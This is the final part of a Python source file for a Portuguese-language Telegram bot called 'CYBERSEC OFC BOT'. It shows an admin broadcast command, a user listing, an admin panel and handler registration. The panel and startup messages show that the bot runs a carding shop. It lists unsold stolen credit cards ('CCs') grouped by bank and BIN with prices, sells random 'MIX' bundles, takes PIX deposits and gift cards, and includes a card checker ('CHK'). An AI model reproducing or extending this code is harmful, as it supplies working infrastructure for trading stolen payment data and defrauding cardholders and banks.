        await update.message.reply_text(
            "❌ Use: /ms [legenda] junto com a foto\n\n"
            "Exemplo: Envie uma foto com a legenda: /ms Nova promoção!"
        )
        return

    caption = update.message.caption[4:].strip()
    photo = update.message.photo[-1].file_id
    
    # Get all users
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    all_users = cursor.fetchall()
    conn.close()

    sent_users = 0
    failed_users = 0
    
    # Send to all users
    for user_row in all_users:
        user_id = user_row[0]
        try:
            await context.bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"📢 **Mensagem do Admin:**\n\n{caption}",
                parse_mode='Markdown'
            )
            sent_users += 1
            await asyncio.sleep(0.1)  # Avoid rate limiting
        except Exception:
            failed_users += 1
    
    # Send to main group
    try:
        chat = await context.bot.get_chat(GROUP_USERNAME)
        await context.bot.send_photo(
            chat_id=chat.id,
            photo=photo,
            caption=f"📢 **Mensagem do Admin:**\n\n{caption}",
            parse_mode='Markdown'
        )
        await update.message.reply_text(
            f"✅ Foto enviada com sucesso!\n\n"
            f"📨 **Usuários:** {sent_users} enviados, {failed_users} falhas\n"
            f"👥 **Grupo principal:** ✅ enviado"
        )
    except Exception as e:
        await update.message.reply_text(
            f"✅ Foto enviada para usuários!\n\n"
            f"📨 **Usuários:** {sent_users} enviados, {failed_users} falhas\n"
            f"❌ **Erro no grupo:** {str(e)}"
        )

async def usuarios_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('''
        SELECT user_id, first_name, username, balance, is_blocked 
        FROM users 
        ORDER BY balance DESC
    ''')
    all_users = cursor.fetchall()
    conn.close()

    if not all_users:
        await update.message.reply_text("❌ Nenhum usuário encontrado!")
        return

    chunk_size = 20
    user_chunks = [
        all_users[i:i + chunk_size]
        for i in range(0, len(all_users), chunk_size)
    ]

    for i, chunk in enumerate(user_chunks):
        text = f"👥 **LISTA DE USUÁRIOS** (Parte {i+1}/{len(user_chunks)})\n\n"

        for user_id, first_name, username, balance, is_blocked in chunk:
            status = "🚫 BLOQUEADO" if is_blocked else "✅ ATIVO"
            username_display = f"@{username}" if username else "Sem username"

            text += f"**ID:** `{user_id}`\n"
            text += f"**Nome:** {first_name}\n"
            text += f"**Username:** {username_display}\n"
            text += f"**Saldo:** R$ {balance:.2f}\n"
            text += f"**Status:** {status}\n"
            text += "─" * 30 + "\n"

        await update.message.reply_text(text, parse_mode='Markdown')

        if i < len(user_chunks) - 1:
            await asyncio.sleep(0.5)

async def painel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('SELECT COUNT(*) FROM users WHERE is_blocked = 0')
    active_users = cursor.fetchone()[0]

    cursor.execute('SELECT COUNT(*) FROM users WHERE is_blocked = 1')
    blocked_users = cursor.fetchone()[0]

    cursor.execute(
        'SELECT first_name, balance FROM users ORDER BY balance DESC LIMIT 3')
    top_users = cursor.fetchall()

    cursor.execute('''
        SELECT cc.bin, cc.bank_name, COUNT(*) as count, COALESCE(bp.price, 10.0) as price
        FROM credit_cards cc
        LEFT JOIN bin_prices bp ON cc.bin = bp.bin
        WHERE cc.is_sold = 0
        GROUP BY cc.bin, cc.bank_name
        ORDER BY cc.bank_name, cc.bin
    ''')
    bins_data = cursor.fetchall()

    conn.close()

    text = "⚙️ **PAINEL ADMINISTRATIVO**\n\n"
    text += f"👥 **Usuários Ativos:** {active_users}\n"
    text += f"🚫 **Usuários Bloqueados:** {blocked_users}\n\n"

    text += "🏆 **TOP 3 SALDOS:**\n"
    for i, (name, balance) in enumerate(top_users, 1):
        text += f"{i}. {name} - R$ {balance:.2f}\n"

    text += "\n🏦 **BINS DISPONÍVEIS:**\n"
    for bin_code, bank_name, count, price in bins_data:
        text += f"• {bank_name} - {bin_code}: {count} CCs - R$ {price:.2f}\n"

    text += "\n💡 **Use /usuarios para ver lista completa de usuários**"

    await update.message.reply_text(text, parse_mode='Markdown')

async def ms_media_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle media messages for MS command"""
    if update.effective_user.id == ADMIN_ID and update.message.caption and update.message.caption.startswith('/ms '):
        # Handle photo with caption
        await ms_photo_command(update, context)
        return

def main():
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO)

    init_db()
    
    # Corrigir saldo do admin na inicialização
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = 0 WHERE user_id = ?', (ADMIN_ID,))
    conn.commit()
    conn.close()

    application = Application.builder().token(BOT_TOKEN).build()

    # Add job queue for checking pending payments
    job_queue = application.job_queue
    job_queue.run_repeating(check_pending_payments, interval=30, first=10)

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("pix", pix_command))
    application.add_handler(CommandHandler("gift", gift_command))
    application.add_handler(CommandHandler("adc", adc_command))
    application.add_handler(CommandHandler("ft", ft_command))
    application.add_handler(CommandHandler("ms", ms_command))
    application.add_handler(CommandHandler("painel", painel_command))
    application.add_handler(CommandHandler("usuarios", usuarios_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("temp", temp_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    application.add_handler(MessageHandler(
        filters.PHOTO & filters.CAPTION,
        ms_media_handler
    ))

    print("🤖 **CYBERSEC OFC BOT** iniciado com sucesso!")
    print("📋 **Funcionalidades disponíveis:**")
    print("  • Compra de cartões por banco e BIN")
    print("  • Sistema de MIX com cartões aleatórios")
    print("  • Verificação de grupo obrigatória")
    print("  • ✅ NOVO: Depósito manual via PV do admin")
    print("  • ✅ NOVO: Usuário é direcionado para @cybersecofc")
    print("  • ✅ NOVO: Admin gera gift card após confirmação")
    print("  • Sistema de gifts")
    print("  • Painel administrativo completo")
    print("  • CHK integrado")
    print("  • MS command simples (texto e foto)")
    print("  • Interface moderna e otimizada")
    print("  • **CORREÇÕES APLICADAS:**")
    print("    ✓ Preço padrão das BINs: R$ 3.00")
    print("    ✓ Sistema de preços funcionando corretamente")
    print("    ✓ Comando /ms simplificado e funcional")
    print("    ✓ Depósito via PV implementado")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
